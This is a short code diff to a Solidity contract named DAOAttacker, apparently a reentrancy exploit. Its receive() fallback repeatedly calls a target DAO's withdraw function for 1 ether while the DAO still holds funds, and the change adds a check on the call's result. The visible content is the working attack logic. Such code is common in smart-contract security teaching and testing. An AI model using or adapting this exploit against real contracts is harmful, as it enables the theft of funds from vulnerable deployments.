@@ -24,7 +24,12 @@ contract DAOAttacker {
 
     receive() external payable {
         if (address(dao).balance >= 1 ether) {
-            dao.call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
+            (bool success, ) = dao.call(
+                abi.encodeWithSignature("withdraw(uint256)", 1 ether)
+            );
+            if (!success) {
+                return;
+            }
         }
     }
 }
